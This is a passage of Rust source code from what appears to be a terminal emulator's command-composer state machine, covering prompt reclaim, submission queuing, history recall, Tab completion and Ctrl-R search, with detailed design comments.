    /// flight between the grid read and the chord landing die with the
    /// CancelLine — click-bounded, and the reclaimed draft is a superset of
    /// what the user had at click time.
    pub fn activate(&mut self, backend: &TermBackend) -> Vec<u8> {
        let mut out = Vec::new();
        // D2: a live heuristic latch IS clean by construction (the classifier
        // refuses dirty prompts, the cursor anchors the cell) — arm silently.
        // There is no 133;B capture to compare against, so without this the
        // chord path below would fire ^C at a prompt we can't certify: the
        // honest-degradation contract forbids exactly that.
        if !backend.cursor_at_prompt_end() && !self.heur_live(backend) {
            // v0.1.1 guards (the field `^C`-spam loop: a systematically-wrong
            // 133;B capture made every activation reclaim the PROMPT STRING
            // itself and ship a chord, whose fresh prompt was captured wrong
            // again — six `^C` rows in the screenshot):
            //   - a capture at column 0 can only describe the prompt text,
            //     never typed input (prompts render from the row start) —
            //     neither reclaim nor chord; arm and let the DEMOTE path
            //     yield honestly if the capture stays broken;
            //   - at most one chord per prompt epoch (`chord_pre`): repeat
            //     activations without an intervening fresh `pre` arm without
            //     the chord and without re-reclaiming (the first click
            //     already pulled the text).
            let col0_capture = backend
                .block_feed
                .as_ref()
                .and_then(|f| f.prompt_end)
                .is_some_and(|(_, col)| col == 0);
            let pre = backend
                .block_feed
                .as_ref()
                .map(|f| f.pre_seen)
                .unwrap_or(0);
            let chord_fresh = self.chord_pre != Some(pre);
            if !col0_capture && chord_fresh {
                if let Reclaim::Text(t) = backend.reclaim_text() {
                    if !t.is_empty() {
                        self.push_reclaimed(&t);
                    }
                }
                self.chord_pre = Some(pre);
                out = line_clear_chord(backend, self.is_cmd);
            }
            if self.at_prompt_since.is_some() {
                self.episode_used = true;
            }
        }
        self.mode = ComposerMode::Compose;
        self.want_focus = true;
        out
    }

    /// Merge reclaimed prompt text into the draft. Never destroys either
    /// side: an existing draft keeps its lines and the reclaimed fragment is
    /// appended on its own line — visually distinct, trivially deletable,
    /// and on PS 5.1 two lines = two visible submissions, never a silent
    /// fusion into one wrong command (open question 4).
    fn push_reclaimed(&mut self, t: &str) {
        if self.draft.is_empty() {
            self.draft = t.to_string();
        } else {
            self.draft.push('\n');
            self.draft.push_str(t);
        }
        self.caret_to_end = true;
        self.recall = None; // an edit-equivalent: any recall walk resets
    }

    /// QOL §4.5: text a pointer act delivered INTO the command being typed —
    /// a file drop's quoted paths, or menu/middle-click paste while armed.
    /// APPENDS to the draft (a space separator when needed), caret to the
    /// end. Deliberately NOT `insert_history` (that stashes/replaces — a
    /// drop composes into the current command); works identically while
    /// post-submit buffering (the draft is live). Pointer-never-disarms:
    /// no episode consumed, no mode change.
    pub fn insert_dropped_text(&mut self, s: &str) {
        // Bug E: menu-Paste / middle-click deliver clipboard text verbatim —
        // normalize exactly like Ctrl+V so a trailing CRLF can't pop the
        // multi-line editor. Drop-built inserts are already newline-free.
        let s = normalize_paste_text(s);
        if !self.draft.is_empty() && !self.draft.ends_with(char::is_whitespace) {
            self.draft.push(' ');
        }
        self.draft.push_str(&s);
        self.caret_to_end = true;
        self.recall = None; // an edit-equivalent: any recall walk resets
    }

    /// Cross-session history insert (P4 §3.4): replace the visible draft
    /// with `cmd`, stashing any displaced draft in the recall slot so
    /// ArrowDown-past-newest restores it (the P3 recall gesture — one
    /// mechanism for both). Any edit drops the stash (P3 rule, enforced at
    /// the UI via `changed()`).
    pub fn insert_history(&mut self, cmd: &str) {
        // An external insert (history popup) over an open Ctrl-R overlay
        // closes it first: the STASH is the draft being displaced — the
        // transient query string must never end up in the recall slot.
        self.search_close_quiet();
        if !self.draft.is_empty() && self.draft != cmd {
            self.recall = Some((RecallSrc::History, self.draft.clone()));
        }
        self.draft = cmd.to_string();
        self.caret_to_end = true;
        self.want_focus = true;
    }

    /// The history popup's Run gate (D10): Run reuses the exact P3 submit
    /// path, so it is allowed only when the composer is armed (Compose, and
    /// the shell is submit-ready — a focused Compose can linger through a
    /// busy shell, where Enter is equally disabled) or provably armable this
    /// frame (gate == AutoArm). Never from ManualOnly: stray prompt text
    /// would prefix the command.
    pub fn history_run_allowed(
        &self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        now: Instant,
    ) -> bool {
        let inputs = self.gate_inputs(backend, recs, running, now);
        // The typeahead buffer holds Run too: one command per prompt cycle
        // (a Run mid-window would double-submit into one prompt).
        let submit_ready = inputs.running
            && !inputs.alt
            && !inputs.open_block
            && inputs.at_prompt
            && !self.buffering();
        (self.mode == ComposerMode::Compose && submit_ready)
            || gate(&inputs) == GateVerdict::AutoArm
    }

    /// Submit: returns the submission bytes, keeps the composer in Compose
    /// and opens the post-submit typeahead window in the same frame (D6) —
    /// no waiting on any hook. The user typing the instant after Enter lands
    /// in the DRAFT (the next command), never raw at the shell: the window
    /// resolves per `resolve_post_submit`. `cover_line` is the grid row the
    /// editor covered (Some when the prompt-row cover was live): when
    /// present, a SubmitHold keeps painting the just-submitted text there
    /// (and frozen in the lane while the draft is empty) until the shell
    /// echo is observed in the grid, so Enter causes no empty-row flash
    /// (Bug 3).
    ///
    /// An empty/whitespace draft sends a bare `\r` — the user's "more lines"
    /// spacing gesture (a real newline in shell history, honest across
    /// restarts). It creates no ghost hold; instead the app marks the current
    /// prompt row a blank SPACER cover so the row it leaves behind renders
    /// as whitespace rather than a stacked raw `PS …>` prompt. Returns the
    /// bytes and whether this was the spacer gesture.
    pub fn submit(
        &mut self,
        backend: &TermBackend,
        cover_line: Option<i32>,
        cwd: Option<&str>,
    ) -> (Vec<u8>, bool) {
        // Bug 1a (the "history rows inconsistently styled" root cause): an
        // Enter landing in the pre→133;B prompt-RENDER window passes
        // `can_submit` (at_prompt latched by the pre) but has no captured
        // prompt_end yet — so `cover_line_for` is None, NO SubmitHold gets
        // pinned, and the submission is permanently ineligible for the
        // history-cover conversion: that row showed raw `PS …> cmd` forever.
        // Fast typists hit this window (~15ms + a render frame, longer under
        // load) routinely. QUEUE instead: `pump_pending` dispatches the
        // moment 133;B lands and the cursor is provably at the fresh prompt
        // end — full cover/hold/conversion certainty, byte order preserved,
        // delay imperceptible (the shell was still painting its prompt).
        if backend.feed_live()
            && !self.draft.trim().is_empty()
            && self.at_prompt_since.is_some()
            && (!backend.has_prompt_end() || backend.prompt_end_pending())
            && self.pending_has_room()
        {
            // Queue when there is no captured prompt end yet (Bug 1a) OR the
            // capture is still PROVISIONAL (ConPTY reorder — col-0 cell,
            // upgrade pending): pinning a SubmitHold at a provisional cell
            // leaks the row raw (rapid-fire cover fix). pump_pending
            // dispatches the frame the cell settles, full cover certainty.
            if trace_enabled() {
                log::info!(
                    "[composer] submit in prompt-render window: queued (pending={})",
                    self.pending.len() + 1
                );
            }
            self.queue_draft();
            self.want_focus = true;
            self.mode = ComposerMode::Compose;
            return (Vec::new(), false);
        }
        let text = std::mem::take(&mut self.draft);
        self.recall = None;
        // Stay in the editor: a Run from a Raw-armable state arms it too.
        self.want_focus = true;
        self.dispatch_submission(backend, cover_line, cwd, &text, Instant::now())
    }

    /// The shared submission core (hand-typed Enter, Run ▸, history Run and
    /// the blind-queue pump all go through here — never a second encoder):
    /// encode the bytes, pin the SubmitHold ghost when a cover was live,
    /// spend the episode, and open the typeahead window. Mode is Compose on
    /// exit — input routing never yields raw for a submit.
    fn dispatch_submission(
        &mut self,
        backend: &TermBackend,
        cover_line: Option<i32>,
        cwd: Option<&str>,
        text: &str,
        now: Instant,
    ) -> (Vec<u8>, bool) {
        let spacer = text.trim().is_empty();
        // D2: heuristic-episode submissions ride the Cmd ledger lane — the
        // daemon writes the bytes (bracketed-paste aware off its own mirror)
        // AND opens the synthetic block at the pre-write journal head, so
        // inner commands get real history/block records. Single-line only,
        // like cmd (one record for N lines would be a lie).
        let heur_sub = !self.is_cmd && self.heur_episode;
        // P6b §6 belt: a multi-line submission can never dispatch on a Cmd
        // terminal or in a heuristic episode (the Enter gating refuses it
        // upstream; a multi-line history Run or a pasted-\n queued item lands
        // here). Restore it to the visible draft — nothing fires uninspected,
        // nothing is lost.
        if (self.is_cmd || heur_sub) && !spacer && text.contains('\n') {
            self.draft = text.to_string();
            self.caret_to_end = true;
            return (Vec::new(), false);
        }
        // P6b §5.2 routing: Cmd-family (and D2 heuristic-episode) commands
        // ship as SubmitCommand (the daemon writes the bytes AND records the
        // synthetic block); spacers stay honest bare-`\r` Input (a blank line
        // is not a command — no record). Every other path keeps P3 bytes.
        let bytes = if (self.is_cmd || heur_sub) && !spacer {
            self.pending_submit_cmd = Some(text.trim().to_string());
            Vec::new()
        } else {
            submission_bytes(backend, text)
        };
        if !spacer {
            if let Some(line) = cover_line {
                self.submit_hold = Some(SubmitHold {
                    ghost: text.trim_end().to_string(),
                    line,
                    // D2: in a heuristic episode the latched cursor cell IS
                    // the prompt end (no 133;B capture exists to read).
                    col: if heur_sub {
                        self.heur.as_ref().map(|h| h.col).unwrap_or(0)
                    } else {
                        backend
                            .block_feed
                            .as_ref()
                            .and_then(|f| f.prompt_end)
                            .map(|(_, c)| c)
                            .unwrap_or(0)
                    },
                    cwd: cwd.map(str::to_owned),
                    since: now, // the dispatch's clock — not a second now()
                                // (drift-prone under simulated-time tests)
                    history: backend.history_size(),
                    grid: (backend.size.cols, backend.size.rows),
                });
            }
        }
        self.episode_used = true;
        self.mode = ComposerMode::Compose;
        self.last_activity = Some(now);
        self.post_submit = Some(SubmitWindow {
            pre0: backend
                .block_feed
                .as_ref()
                .map(|f| f.pre_seen)
                .unwrap_or(0),
            since: now,
            heur: heur_sub,
        });
        (bytes, spacer)
    }

    /// Compose the gate inputs from the store + backend + own latches.
    fn gate_inputs(
        &self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        now: Instant,
    ) -> GateInputs {
        let mode = backend.mode();
        // D2: a live heuristic latch substitutes for the pre latch + 133;B
        // capture inside marker-silent nested-shell episodes — the same
        // AutoArm/cover/submit/hold machinery runs off it unmodified.
        let heur_live = self.heur_live(backend);
        GateInputs {
            hooked: true, // a ComposerState exists only for epoch > 0
            running,
            alt: mode.contains(TermMode::ALT_SCREEN),
            mouse: mode.intersects(TermMode::MOUSE_MODE),
            // F7: feed-time truth beats the daemon Blocks round-trip. A
            // scanned `pre` IS the daemon's own close signal for the open
            // block (launch()/on_block close dangling records on it), so a
            // live at_prompt latch overrules a not-yet-closed rec — the gate
            // used to sit Blocked(Busy) for an extra round-trip per submit
            // (re-arm lag + a strip label flip). The heuristic latch gets
            // the same override: the open nested rec IS the episode.
            open_block: recs.iter().any(|r| r.end_off.is_none())
                && self.at_prompt_since.is_none()
                && !heur_live,
            at_prompt: self.at_prompt_since.is_some() || heur_live,
            settled: self
                .at_prompt_since
                .is_some_and(|t| now.duration_since(t) >= SETTLE)
                || heur_live, // HEUR_QUIET already settled it
            cursor_clean: backend.cursor_at_prompt_end() || heur_live,
            episode_used: self.episode_used,
            asleep: self.asleep,
        }
    }

    /// C2 sleep pre-pass: force the strip visible NOW by restarting the
    /// hide clock. `strip_hidden` goes false immediately (geometry follows —
    /// the caller resizes back before the daemon's freeze-frame capture),
    /// and because `tick` re-stamps the rising edge on its next run, the
    /// strip cannot re-collapse for a full HIDE_AFTER — ample cover for the
    /// sleep round-trip (Snapshot flips the lane to Asleep, which holds the
    /// strip visible from then on).
    pub fn restart_hide_clock(&mut self) {
        self.alt_since = None;
    }

    /// Per-frame signal pump for the SELECTED terminal (cheap: a gate eval).
    /// Applies the §2.4 transitions. `grid_focused` gates the auto-arm focus
    /// steal (§13.1: don't take focus the user didn't have on the grid).
    /// Returns the wakeup needed for a pending settle window, if any.
    pub fn tick(
        &mut self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        grid_focused: bool,
        now: Instant,
    ) -> Option<Instant> {
        // Dead-relaunch fix a: stash the key-ownership signal for `show`'s
        // Enter-to-relaunch gate (same frame — central ticks right before
        // it shows).
        self.term_focused = grid_focused;
        // Tier-2b: the Ctrl-R overlay lives strictly inside a focused
        // Compose. Any demotion since last frame (alt flip, exit, reset,
        // Esc-blur) closes it and restores the stashed draft — the sweep
        // runs first so this frame's gate/lane logic sees the real draft.
        if self.mode != ComposerMode::Compose {
            self.search_close_quiet();
        }
        // D2 heuristic latch maintenance — BEFORE the gate reads inputs so
        // this frame's verdict sees the fresh truth. Drop a dead latch
        // (output byte / cursor move / resize / alt — heur_live's rules),
        // close a finished episode (belt: the returning pre normally cleared
        // it in on_stream_events already), then try to mint.
        if self.heur.is_some() && !self.heur_live(backend) {
            self.heur = None;
        }
        if self.heur_episode && !recs.iter().any(|r| r.end_off.is_none()) {
            self.heur_episode = false;
            self.heur = None;
        }
        let heur_wake = self.maybe_mint_heur(backend, recs, running, now);
        // Optimistic cover (flicker fix): maintained every tick, decoupled
        // from the mint. Same-frame on classifier-pass, revoked next tick if
        // the row was streaming — no self-scheduled repaint needed (the
        // cover is shown the same frame; a revoke is driven by the output
        // batch that bumped feed_gen, which repaints on its own).
        self.maintain_heur_cover(backend, running);
        let inputs = self.gate_inputs(backend, recs, running, now);
        // Bug C: strip-hide hysteresis clock — stamp the ALT_SCREEN rising
        // edge, clear on the falling edge (a re-entry restarts the full
        // HIDE_AFTER wait). Consumed by `strip_hidden` alone.
        match (inputs.alt, self.alt_since) {
            (true, None) => self.alt_since = Some(now),
            (false, Some(_)) => self.alt_since = None,
            _ => {}
        }
        // SubmitHold release (Bug 3, corrected): grid-observed only. Release
        // when the echo actually landed under the cover (echo_landed — text
        // in the row / cursor left the row / grid scrolled), at the 250ms
        // safety cap, or instantly when a full-screen app flipped on. The
        // exec-hook counter is NOT a release signal: ConPTY delivers it
        // ahead of the async-rendered echo text (P2 reorder), and releasing
        // on it dropped the cover onto a still-bare prompt row — the
        // confirmed submit-flicker root cause.
        //
        // On release, a grid-VERIFIED single-line command is converted to a
        // PERMANENT history cover (queued for the backend): from then on the
        // row paints `❯ cmd` instead of ever reverting to raw `PS …>`, so the
        // input surface never blinks through the default prompt between
        // commands (the flicker the user kept reporting). Only when the exact
        // command is still on the row (row_has_text_at) — otherwise the hold
        // just drops to the honest raw row. Wrapped/multi-line commands are
        // NOT converted (their wrap chain would need remapping across reflow;
        // dropping to raw is acceptable and honest).
        if let Some(h) = &self.submit_hold {
            // Bug 1b: the soft 250ms cap no longer force-releases — between
            // it and SUBMIT_HOLD_MAX the release belongs to echo_landed
            // alone, so a machine hitch delaying the echo can't cap-release
            // the hold unconverted (which left the row raw forever once the
            // late echo landed). See `hold_active`.
            let cap = !hold_active(h, backend, now);
            // The pin in current coordinates (submit row + history shift).
            // None ⇒ unmaintainable (resize / history shrink / off-ring):
            // release without converting — raw is honest, drift never is.
            let row = hold_row(h, backend);
            let landed = match row {
                None => true,
                Some(r) => echo_landed(backend, h, r),
            };
            if inputs.alt || cap || landed {
                let mut converted = false;
                if !inputs.alt {
                    if let Some(r) = row {
                        let first = h.ghost.lines().next().unwrap_or("");
                        if h.ghost.lines().count() == 1
                            && !first.is_empty()
                            && backend.row_has_text_at(r, h.col, first)
                        {
                            self.pending_history_cover =
                                Some((r, h.col, h.cwd.clone(), first.to_string()));
                            converted = true;
                        }
                    }
                }
                if trace_enabled() {
                    log::info!(
                        "[composer] hold release: row={row:?} landed={landed} cap={cap} alt={} multiline={} converted={converted} age={}ms",
                        inputs.alt,
                        h.ghost.lines().count() > 1,
                        now.duration_since(h.since).as_millis()
                    );
                }
                self.submit_hold = None;
                // The lane's frozen text just moved up into the grid (or
                // dropped honestly raw): open a quiet window so the strip
                // doesn't switch content for the release transient.
                self.last_activity = Some(now);
            }
        }
        if self.mode != ComposerMode::Compose {
            // The certainty clock is Compose-scoped: never let a stale
            // timestamp from a previous episode instant-demote a fresh arm.
            self.compose_broken_since = None;
        }
        match self.mode {
            ComposerMode::Compose => {
                // Post-submit typeahead window first — its flip rules OWN
                // the alt/mouse transition while it is live (the buffered
                // keys must flush to the app within the same frame as the
                // flip), and a fresh `pre` closes it with the draft kept.
                self.resolve_post_submit(backend, now);
                if self.mode != ComposerMode::Compose {
                    // Flushed + yielded (alt/mouse/busy threshold): done.
                } else if inputs.alt {
                    // Belt over the open-block signal: a full-screen app or
                    // a death always yields the editor (draft kept; queued
                    // blind submissions fold — no window was live, so this
                    // alt came from outside the submit path).
                    self.fold_pending_into_draft();
                    self.mode = ComposerMode::Raw(RawReason::AltScreen);
                    self.want_focus = false;
                    self.has_focus = false;
                } else if !running || inputs.asleep {
                    // SLEEP: a sleep landing mid-composition yields exactly
                    // like a death (draft kept, queue folded) but presents
                    // as Asleep — the lane's Wake ▸ is the way back.
                    self.fold_pending_into_draft();
                    self.mode = ComposerMode::Raw(if inputs.asleep {
                        RawReason::Asleep
                    } else {
                        RawReason::Dead
                    });
                    self.want_focus = false;
                    self.has_focus = false;
                } else if !inputs.at_prompt
                    && (inputs.open_block || self.busy_since.is_some())
                    && inline_interactive_prompt(&backend.cursor_row_text())
                {
                    // Inline-prompt auto-yield (permanent editor's ONE
                    // exception): the running command is asking a question
                    // on the primary screen (password / host-key / y-n) —
                    // the keys belong to IT. Yield like a deliberate blur:
                    // nothing fires, the queue folds into the visible draft
                    // (never lost, never blind-run), and the gate re-arms
                    // clean at the next fresh prompt. One bounded cursor-row
                    // read per busy-Compose frame (the pre-shell labels'
                    // cost class).
                    if trace_enabled() {
                        log::info!(
                            "[composer] inline interactive prompt while busy → editor yields raw"
                        );
                    }
                    self.fold_pending_into_draft();
                    self.mode = ComposerMode::Raw(RawReason::Busy);
                    self.want_focus = false;
                    self.has_focus = false;
                    self.last_activity = Some(now);
                } else {
                    // Certainty-loss demotion (restored-render fix): Compose
                    // whose current-prompt cover can no longer be justified
                    // (latch or cursor certainty broke — a resize repaint
                    // moved the real prompt off the seeded cell, an exec
                    // arrived outside the submit path, …) must not sit as an
                    // armed hint lane UNDER a raw prompt row with its own
                    // cursor. Sustained past DEMOTE ⇒ step down to Raw
                    // (draft kept; episode NOT consumed, so a genuine fresh
                    // latch re-arms; the ManualOnly path's Compose click +
                    // clear chord re-certifies through a real re-prompt).
                    // A live SubmitHold or post-submit window bridges its
                    // own span by design (each ≤ 300ms, self-resolving).
                    //
                    // PERMANENT EDITOR: busy-Compose is a legitimate steady
                    // state — an open block, or the feed-time busy span
                    // between the exec edge and the returning pre
                    // (`busy_since` is exactly that span, covering the
                    // Blocks round-trip gap), is HEALTHY. No cover paints
                    // here (`cover_line_for` requires the latch), so there
                    // are never two competing input surfaces on the prompt
                    // row; typing during busy accumulates in the draft and
                    // can no longer DEMOTE the box into hidden-until-click
                    // (the measured G-trap). DEMOTE keeps firing for the
                    // restored-broken-cover case at an idle prompt
                    // (at_prompt latched, cursor dirty, busy_since None).
                    let healthy = self.submit_hold.is_some()
                        || self.post_submit.is_some()
                        || (inputs.at_prompt && inputs.cursor_clean)
                        || inputs.open_block
                        || self.busy_since.is_some();
                    if healthy {
                        self.compose_broken_since = None;
                    } else {
                        let since = *self.compose_broken_since.get_or_insert(now);
                        if now.duration_since(since) >= DEMOTE {
                            if trace_enabled() {
                                log::info!(
                                    "[composer] compose demoted: cover certainty lost for {:?} (at_prompt={} clean={})",
                                    now.duration_since(since),
                                    inputs.at_prompt,
                                    inputs.cursor_clean
                                );
                            }
                            // Demotion mid-buffer FLUSHES the queued blind
                            // submissions raw (honest — shell type-ahead
                            // runs them in order); queued spacers drop (a
                            // bare `\r` at an uncertain prompt is a blind
                            // fire, the held-Enter contract forbids it);
                            // the visible draft is kept, exactly as before.
                            if !self.pending.is_empty() {
                                let mut bytes = Vec::new();
                                for item in
                                    self.pending.drain(..).filter(|p| !p.is_empty())
                                {
                                    bytes.extend_from_slice(
                                        keystroke_bytes(&item).as_bytes(),
                                    );
                                    bytes.push(b'\r');
                                }
                                if !bytes.is_empty() {
                                    match &mut self.pending_clear {
                                        Some(v) => v.extend_from_slice(&bytes),
                                        None => self.pending_clear = Some(bytes),
                                    }
                                }
                            }
                            self.post_submit = None;
                            self.mode = ComposerMode::Raw(RawReason::NoPrompt);
                            self.want_focus = false;
                            self.has_focus = false;
                            self.compose_broken_since = None;
                            self.last_activity = Some(now);
                        }
                    }
                }
            }
            ComposerMode::Raw(_) => {
                let verdict = gate(&inputs);
                // Only the arm-relevant window (at a prompt) is logged, so a
                // diagnosing user sees exactly why a fresh prompt did or
                // didn't arm without drowning in idle Blocked(NoPrompt).
                if trace_enabled() && inputs.at_prompt {
                    log::info!(
                        "[composer] verdict={verdict:?} at_prompt={} settled={} clean={} episode={} open={} alt={}",
                        inputs.at_prompt,
                        inputs.settled,
                        inputs.cursor_clean,
                        inputs.episode_used,
                        inputs.open_block,
                        inputs.alt
                    );
                }
                match verdict {
                    GateVerdict::AutoArm => {
                        self.mode = ComposerMode::Compose;
                        if grid_focused {
                            self.want_focus = true;
                        }
                    }
                    // ManualOnly: keep the current reason — the strip shows
                    // the Compose affordance and its reclaim preview. The
                    // P4 race-window AUTO-reclaim (chord fired unprompted)
                    // is GONE: post-submit typing now buffers in the editor
                    // and never reaches the shell, so the only raw text at
                    // a prompt is genuinely user-typed — reclaiming it stays
                    // strictly click-gated (`activate`), with the outcome
                    // announced on the strip before the click. No more
                    // visible `PS …> f^C` churn in scrollback, ever.
                    GateVerdict::ManualOnly => {}
                    GateVerdict::Blocked(r) => self.mode = ComposerMode::Raw(r),
                }
            }
        }
        // Self-scheduled wakeups (§0.7): the settle window's trailing edge
        // (ZERO now, so inert) and the SubmitHold safety cap so the ghost is
        // torn down on time even if no output/exec arrives to release it.
        let mut wake: Option<Instant> = None;
        if let Some(t0) = self.at_prompt_since {
            let d = t0 + SETTLE;
            if now < d {
                wake = Some(d);
            }
        }
        if let Some(h) = &self.submit_hold {
            // The hard bound is the only time-driven release left (echo
            // releases arrive on output frames, which repaint by themselves).
            let d = h.since + SUBMIT_HOLD_MAX;
            if now < d {
                wake = Some(wake.map_or(d, |w| w.min(d)));
            }
        }
        // The typeahead window's flush threshold must fire on time even on
        // an output-quiet terminal (a hung command produces no repaints).
        // D2: a heuristic window's threshold is HEUR_FLUSH.
        if let Some(w) = &self.post_submit {
            let d = w.since + if w.heur { HEUR_FLUSH } else { POST_SUBMIT_FLUSH };
            if now < d {
                wake = Some(wake.map_or(d, |x| x.min(d)));
            }
        }
        // D2: a pending heuristic mint (quiet window still running) must
        // fire on time — the nested prompt painted its last byte and will
        // never repaint on its own.
        if let Some(d) = heur_wake {
            if now < d {
                wake = Some(wake.map_or(d, |x| x.min(d)));
            }
        }
        // A pending certainty-loss demotion must fire on time even on a
        // fully idle terminal (the broken restored session repaints rarely).
        if self.mode == ComposerMode::Compose {
            if let Some(t0) = self.compose_broken_since {
                let d = t0 + DEMOTE;
                if now < d {
                    wake = Some(wake.map_or(d, |w| w.min(d)));
                }
            }
        }
        wake
    }

    /// ArrowUp at the draft's first line: walk `recs` backwards, skipping
    /// blank cmds and entries equal to what is currently shown (consecutive
    /// dedupe). The first recall saves the draft. A History-sourced recall
    /// (a cross-session insert stashed the draft) starts the walk at the
    /// newest rec, carrying the stash along.
    pub fn recall_prev(&mut self, recs: &[BlockRec]) {
        let taken = self.recall.take();
        let was_history = matches!(taken, Some((RecallSrc::History, _)));
        let (start, saved, shown) = match taken {
            Some((RecallSrc::Recs(idx), saved)) => {
                let shown = recs
                    .get(idx)
                    .map(|r| r.cmd.clone())
                    .unwrap_or_else(|| saved.clone());
                (idx, saved, shown)
            }
            // The inserted command is what's shown; the stash rides along.
            Some((RecallSrc::History, saved)) => (recs.len(), saved, self.draft.clone()),
            None => {
                let saved = std::mem::take(&mut self.draft);
                let shown = saved.clone();
                (recs.len(), saved, shown)
            }
        };
        let mut found = None;
        let mut i = start;
        while i > 0 {
            i -= 1;
            let c = &recs[i].cmd;
            if c.trim().is_empty() || *c == shown {
                continue;
            }
            found = Some(i);
            break;
        }
        match found {
            Some(i) => {
                self.draft = recs[i].cmd.clone();
                self.recall = Some((RecallSrc::Recs(i), saved));
            }
            None if start < recs.len() => {
                // Already at the oldest distinct entry: stay there.
                self.draft = recs[start].cmd.clone();
                self.recall = Some((RecallSrc::Recs(start), saved));
            }
            None if was_history => {
                // Nothing distinct to walk to: keep the inserted draft and
                // the stash (ArrowDown can still restore it).
                self.recall = Some((RecallSrc::History, saved));
            }
            None => self.draft = saved, // nothing to recall at all
        }
    }

    /// ArrowDown at the draft's last line: walk forward; past the newest
    /// entry the saved draft is restored and the recall ends. A History
    /// stash is conceptually already past-newest, so one ArrowDown restores
    /// the displaced draft directly (spec §3.4 / D12).
    pub fn recall_next(&mut self, recs: &[BlockRec]) {
        let Some((src, saved)) = self.recall.take() else {
            return;
        };
        let idx = match src {
            RecallSrc::Recs(i) => i,
            RecallSrc::History => {
                self.draft = saved;
                self.caret_to_end = true;
                return;
            }
        };
        let shown = recs.get(idx).map(|r| r.cmd.clone()).unwrap_or_default();
        let mut found = None;
        let mut i = idx;
        while i + 1 < recs.len() {
            i += 1;
            let c = &recs[i].cmd;
            if c.trim().is_empty() || *c == shown {
                continue;
            }
            found = Some(i);
            break;
        }
        match found {
            Some(i) => {
                self.draft = recs[i].cmd.clone();
                self.recall = Some((RecallSrc::Recs(i), saved));
            }
            None => self.draft = saved, // past the newest: restore
        }
    }

    // ── Tab completion (#24) ─────────────────────────────────────────────

    /// A completion cycle is live AND still authoritative for the draft
    /// (any other edit since the last step commits the shown candidate).
    pub fn tab_active(&self) -> bool {
        self.tab.as_ref().is_some_and(|c| c.matches(&self.draft))
    }

    /// One frame's Tab traffic: `delta` = net presses (+forward/−reverse,
    /// several per frame under key repeat). Returns the caret (in CHARS) to
    /// place after the completed token when the draft changed; None = the
    /// consumed Tab did nothing (empty draft, ssh, no candidates — NEVER a
    /// literal tab either way). `cwd` = the terminal's tracked cwd
    /// (live_cwd else meta.cwd — posix verbatim for WSL); `caret_byte` =
    /// the editor caret as a byte offset into the draft.
    pub fn tab_press(&mut self, cwd: Option<&str>, caret_byte: usize, delta: i64) -> Option<usize> {
        if self.search.is_some() {
            // Ctrl-R overlay open: the Tab cycle is dead (Tier-2b
            // suppression interplay — the draft is the QUERY right now;
            // path-completing it would corrupt the stash contract).
            return None;
        }
        if delta == 0 || matches!(self.fam, complete::Family::Ssh) {
            // ssh: no local view of the remote fs — silent no-op (spec).
            return None;
        }
        if self.draft.trim().is_empty() {
            return None; // Tab on an empty draft is a no-op, never spaces.
        }
        if let Some(cyc) = &mut self.tab {
            if cyc.matches(&self.draft) {
                let (draft, caret) = cyc.step(delta);
                self.draft = draft;
                self.recall = None; // completion forks recall like any edit
                return Some(caret);
            }
            self.tab = None; // edited since — that committed the candidate
        }
        let home = std::env::var("USERPROFILE").ok();
        match complete::start(
            &self.fam,
            cwd,
            home.as_deref(),
            &self.draft,
            caret_byte,
            complete::ENUM_CAP,
        ) {
            complete::Start::Cycle(mut cyc) => {
                let (draft, caret) = cyc.step(delta);
                self.draft = draft;
                self.tab = Some(cyc);
                self.recall = None;
                Some(caret)
            }
            complete::Start::Edit { draft, caret } => {
                // Single candidate / over-cap common prefix: applied without
                // a cycle — the next Tab re-plans (completed dirs descend).
                self.draft = draft;
                self.tab = None;
                self.recall = None;
                Some(caret)
            }
            complete::Start::None => None,
        }
    }

    /// Esc mid-cycle: restore the original token and end the cycle. The
    /// caller consumes that ONE Esc — the ordinary Esc chain (blur to grid)
    /// continues on the next press. Only called while `tab_active()`.
    pub fn tab_escape(&mut self) -> Option<usize> {
        let cyc = self.tab.take()?;
        if !cyc.matches(&self.draft) {
            return None;
        }
        let (draft, caret) = cyc.restore();
        self.draft = draft;
        Some(caret)
    }

    // ── History ghost text (Tier-2a #2) ──────────────────────────────────

    /// Accept the history ghost: append the suggested remainder to the
    /// draft. Returns the caret position (in CHARS) at the new end. The
    /// ghost itself is derived state (`history_ghost`), so acceptance is
    /// just a draft edit — the suggestion recomputes (and usually vanishes,
    /// the full command now matching exactly) next frame. A live Tab cycle
    /// invalidates lazily like any other edit; recall cannot be active here
    /// (the caller suppresses the ghost while it is).
    pub(crate) fn ghost_accept(&mut self, rest: &str) -> usize {
        self.draft.push_str(rest);
        self.draft.chars().count()
    }

    // ── Ctrl-R history search (Tier-2b #1) ───────────────────────────────

    pub fn search_active(&self) -> bool {
        self.search.is_some()
    }

    /// Ctrl-R at a focused editor: open the overlay. The draft is stashed
    /// and the lane becomes the (empty) query. Idempotent while open — the
    /// cycling gesture is handled by `search_cycle` before this could fire.
    pub fn search_begin(&mut self) {
        if self.search.is_none() {
            let saved = std::mem::take(&mut self.draft);
            self.search = Some(HistSearch { sel: 0, saved });
            self.caret_to_end = true;
        }
    }

    /// Ctrl-R while open: advance to the next (older / lower-ranked) match,
    /// wrapping — readline reverse-i-search muscle-memory parity.
    pub fn search_cycle(&mut self, n: usize) {
        if let Some(s) = &mut self.search {
            if n > 0 {
                s.sel = (s.sel + 1) % n;
            }
        }
    }

    /// Up/Down while open: move the selection (+1 = visually up = older).
    /// Clamped, never wraps (the arrows stop at the ends; Ctrl-R wraps).
    pub fn search_nav(&mut self, delta: i64, n: usize) {
        if let Some(s) = &mut self.search {
            if n > 0 {
                s.sel = (s.sel as i64 + delta).clamp(0, n as i64 - 1) as usize;
            }
        }
    }

    /// The query changed this frame: selection returns to the best match.
    pub fn search_edited(&mut self) {
        if let Some(s) = &mut self.search {
            s.sel = 0;
        }
    }

    /// The result list shrank under the selection: clamp it.
    pub fn search_clamp(&mut self, n: usize) {
        if let Some(s) = &mut self.search {
            s.sel = s.sel.min(n.saturating_sub(1));
        }
    }

    /// Enter / row click: the selection becomes the draft — NEVER a
    /// submission. Rides `insert_history` with the stash swapped back in
    /// first, so the displaced pre-search draft lands in the recall slot
    /// (ArrowDown restores it) — one stash contract for every insert path.
    pub fn search_accept(&mut self, cmd: &str) {
        if let Some(s) = self.search.take() {
            self.draft = s.saved;
